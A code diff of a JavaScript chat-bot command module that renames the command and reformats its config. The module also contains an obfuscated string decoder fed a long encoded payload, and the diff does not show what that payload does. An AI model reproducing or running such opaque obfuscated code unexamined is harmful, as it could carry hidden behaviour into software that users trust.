@@ -1,14 +1,14 @@
 module.exports.config = {
-      name: "bot1",
-      version: "0.0.2",
-      permission: 0,
-      prefix: false,
-      credits: "Nayan",
-      description: "talk with bot",
-      category: "user",
-      usages: "",
-      cooldowns: 5,
-    };
+  name: "bot",
+  version: "0.0.2",
+  permission: 0,
+  prefix: false,
+  credits: "Nayan",
+  description: "talk with bot",
+  category: "user",
+  usages: "",
+    cooldowns: 5,
+};
 
     var lang = "bn";
 
@@ -40,4 +40,5 @@ module.exports.config = {
         r += String.fromCharCode(_0xe87c(s, e, 10) - t)
       }
       return decodeURIComponent(escape(r))
-    }("TFreTOreXXreXTrkFOrkFDrTFrePXreFFrkeFreFOreFOreTDreTDreFPreTOreePrePXreFFrkeFreFDreTTreTOreTDreeOreTTrkFPreXTreTOrkFDreXereXXreXTrTFrePXreFFrkeFreFDreTTreTOreTDrXFrePXreFFrkeFreFkreFTreFDreTkreeereeerXDrePXreFFrkeFreTTreFFreTPreeereTkreTDrXerkeOreTOreXXreXTrkFOrkFDrTFrePXreFFrkeFreFkreFereFXreTereTkreeFreePrePXreFFrkeFreFDreTTreTOreTDrXDrePXreFFrkeFreFkreTTreFkreTDreTOreFPreePrePXreFFrkeFreFereFkreFPreTTreFDreTerXDrePXreFFrkeFreTOreFFreTOreTkreTkreTPrXerkeOreTOreXXreXTrkFOrkFDrTF
+    }("TFreTOreXXreXTrkFOrkFDrTFrePXreFFrkeFreFOreFOreTDreTDreFPreTOreePrePXreFFrkeFreFDreTTreTOreTDreeOreTTrkFPreXTreTOrkFDreXereXXreXTrTFrePXreFFrkeFreFDreTTreTOreTDrXFrePXreFFrkeFreFkreFTreFDreTkreeereeerXDrePXreFFrkeFreTTreFFreTPreeereTkreTDrXerkeOreTOreXXreXTrkFOrkFDrTFrePXreFFrkeFreFkreFereFXreTereTkreeFreePrePXreFFrkeFreFDreTTreTOreTDrXDrePXreFFrkeFreFkreTTreFkreTDreTOreFPreePrePXreFFrkeFreFereFkreFPreTTreFDreTerXDrePXreFFrkeFreTOreFFreTOreTkreTkreTPrXerkeOreTOreXXreXTrkFOrkFDrTF"));
+ 
